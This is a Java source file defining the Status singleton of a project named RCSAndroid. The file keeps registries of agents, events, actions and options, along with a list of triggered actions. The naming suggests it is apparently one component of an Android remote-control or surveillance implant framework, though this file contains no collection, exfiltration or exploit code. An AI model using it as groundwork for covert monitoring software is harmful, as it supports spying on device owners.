/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import java.util.ArrayList;
import java.util.HashMap;

import android.content.Context;

import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.agent.Agent;
import com.ht.RCSAndroidGUI.conf.Option;
import com.ht.RCSAndroidGUI.event.Event;
import com.ht.RCSAndroidGUI.utils.Check;

// TODO: Auto-generated Javadoc
// Singleton Class
/**
 * The Class Status.
 */
public class Status {

	/** The agents map. */
	private final HashMap<Integer, Agent> agentsMap;
	
	/** The events map. */
	private final HashMap<Integer, Event> eventsMap;
	
	/** The actions map. */
	private final HashMap<Integer, Action> actionsMap;
	
	/** The options map. */
	private final HashMap<Integer, Option> optionsMap;

	/** The triggered actions. */
	ArrayList<Integer> triggeredActions = new ArrayList<Integer>();

	/** The synced. */
	public boolean synced;

	/** The drift. */
	public int drift;
	
	/** The context. */
	private static Context context;


	/**
	 * Instantiates a new status.
	 */
	private Status() {
		agentsMap = new HashMap<Integer, Agent>();
		eventsMap = new HashMap<Integer, Event>();
		actionsMap = new HashMap<Integer, Action>();
		optionsMap = new HashMap<Integer, Option>();
	}

	/** The singleton. */
	private volatile static Status singleton;

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static Status self() {
		if (singleton == null) {
			synchronized (Status.class) {
				if (singleton == null) {
					singleton = new Status();
				}
			}
		}

		return singleton;
	}

	/**
	 * Clean.
	 */
	public void clean() {
		agentsMap.clear();
		eventsMap.clear();
		actionsMap.clear();
		optionsMap.clear();
	}
	
	/**
	 * Gets the app context.
	 *
	 * @return the app context
	 */
	public static Context getAppContext() {
		Check.requires(context != null, "Null Context");
		return context;
	}
	
	public static void setAppContext(Context context) {
		Check.requires(context != null, "Null Context");
		Status.context=context;
	}

	// Add an agent to the map
	/**
	 * Adds the agent.
	 *
	 * @param a the a
	 * @throws RCSException the rCS exception
	 */
	public void addAgent(final Agent a) throws RCSException {
		// Don't add the same agent twice
		if (agentsMap.containsKey(a.getId()) == true) {
			throw new RCSException("Agent " + a.getId() + " already loaded");
		}

		agentsMap.put(a.getId(), a);
	}

	// Stop an agent
	/**
	 * Stop agent.
	 *
	 * @param a the a
	 * @throws RCSException the rCS exception
	 */
	public void stopAgent(final Agent a) throws RCSException {
		if (agentsMap.containsKey(a.getId()) == false) {
			throw new RCSException("Agent " + a.getId()
					+ " cannot be stopped because it doesn't exist");
		}

		final Agent agent = agentsMap.get(a.getId());

		if (agent == null) {
			return;
		}

		agent.stopAgent();
	}

	// Add an event to the map
	/**
	 * Adds the event.
	 *
	 * @param e the e
	 * @throws RCSException the rCS exception
	 */
	public void addEvent(final Event e) throws RCSException {
		// Don't add the same event twice
		if (eventsMap.containsKey(e.getId()) == true) {
			throw new RCSException("Event " + e.getId() + " already loaded");
		}

		eventsMap.put(e.getId(), e);
	}

	// Add an action to the map
	/**
	 * Adds the action.
	 *
	 * @param a the a
	 * @throws RCSException the rCS exception
	 */
	public void addAction(final Action a) throws RCSException {
		// Don't add the same action twice
		if (actionsMap.containsKey(a.getId()) == true) {
			throw new RCSException("Action " + a.getId() + " already loaded");
		}

		actionsMap.put(a.getId(), a);
	}

	// Add an option to the map
	/**
	 * Adds the option.
	 *
	 * @param o the o
	 * @throws RCSException the rCS exception
	 */
	public void addOption(final Option o) throws RCSException {
		// Don't add the same option twice
		if (optionsMap.containsKey(o.getId()) == true) {
			throw new RCSException("Option " + o.getId() + " already loaded");
		}

		optionsMap.put(o.getId(), o);
	}

	/**
	 * Gets the actions number.
	 *
	 * @return the actions number
	 */
	public int getActionsNumber() {
		return actionsMap.size();
	}

	/**
	 * Gets the agents number.
	 *
	 * @return the agents number
	 */
	public int getAgentsNumber() {
		return agentsMap.size();
	}

	/**
	 * Gets the events number.
	 *
	 * @return the events number
	 */
	public int getEventsNumber() {
		return eventsMap.size();
	}

	/**
	 * Gets the optionss number.
	 *
	 * @return the optionss number
	 */
	public int getOptionssNumber() {
		return optionsMap.size();
	}

	/**
	 * Gets the agents map.
	 *
	 * @return the agents map
	 */
	public HashMap<Integer, Agent> getAgentsMap() {
		return agentsMap;
	}

	/**
	 * Gets the events map.
	 *
	 * @return the events map
	 */
	public HashMap<Integer, Event> getEventsMap() {
		return eventsMap;
	}

	/**
	 * Gets the actions map.
	 *
	 * @return the actions map
	 */
	public HashMap<Integer, Action> getActionsMap() {
		return actionsMap;
	}

	/**
	 * Gets the action.
	 *
	 * @param index the index
	 * @return the action
	 * @throws RCSException the rCS exception
	 */
	public Action getAction(final int index) throws RCSException {
		if (actionsMap.containsKey(index) == false) {
			throw new RCSException("Action " + index + " not found");
		}

		final Action a = actionsMap.get(index);

		if (a == null) {
			throw new RCSException("Action " + index + " is null");
		}

		return a;
	}

	/**
	 * Gets the agent.
	 *
	 * @param id the id
	 * @return the agent
	 * @throws RCSException the rCS exception
	 */
	public Agent getAgent(final int id) throws RCSException {
		if (agentsMap.containsKey(id) == false) {
			throw new RCSException("Agent " + id + " not found");
		}

		final Agent a = agentsMap.get(id);

		if (a == null) {
			throw new RCSException("Agent " + id + " is null");
		}

		return a;
	}

	/**
	 * Gets the event.
	 *
	 * @param id the id
	 * @return the event
	 * @throws RCSException the rCS exception
	 */
	public Event getEvent(final int id) throws RCSException {
		if (eventsMap.containsKey(id) == false) {
			throw new RCSException("Event " + id + " not found");
		}

		final Event e = eventsMap.get(id);

		if (e == null) {
			throw new RCSException("Event " + id + " is null");
		}

		return e;
	}

	/**
	 * Gets the option.
	 *
	 * @param id the id
	 * @return the option
	 * @throws RCSException the rCS exception
	 */
	public Option getOption(final int id) throws RCSException {
		if (optionsMap.containsKey(id) == false) {
			throw new RCSException("Option " + id + " not found");
		}

		final Option o = optionsMap.get(id);

		if (o == null) {
			throw new RCSException("Option " + id + " is null");
		}

		return o;
	}

	/**
	 * Crisis sync.
	 *
	 * @return true, if successful
	 */
	public boolean crisisSync() {
		// TODO Auto-generated method stub
		return false;
	}

	/**
	 * Backlight.
	 *
	 * @return true, if successful
	 */
	public boolean backlight() {
		// TODO Auto-generated method stub
		return false;
	}

	/**
	 * Trigger action.
	 *
	 * @param i the i
	 */
	public void triggerAction(final int i) {
		synchronized (triggeredActions) {
			if (!triggeredActions.contains(i)) {
				triggeredActions.add(new Integer(i));
			}
		}
	}

	/**
	 * Gets the triggered actions.
	 *
	 * @return the triggered actions
	 */
	public int[] getTriggeredActions() {
		synchronized (triggeredActions) {
			final int size = triggeredActions.size();
			final int[] triggered = new int[size];
			for (int i = 0; i < size; i++) {
				triggered[i] = triggeredActions.get(i);
			}
			return triggered;
		}
	}

	/**
	 * Un trigger action.
	 *
	 * @param action the action
	 */
	public void unTriggerAction(final Action action) {
		synchronized (triggeredActions) {
			if (triggeredActions.contains(action.getId())) {
				triggeredActions.remove(new Integer(action.getId()));
			}
		}
	}

	/**
	 * Un trigger all.
	 */
	public void unTriggerAll() {
		synchronized (triggeredActions) {
			triggeredActions.clear();
		}

	}

	/**
	 * Sets the restarting.
	 *
	 * @param b the new restarting
	 */
	public void setRestarting(final boolean b) {
		// TODO Auto-generated method stub

	}
}
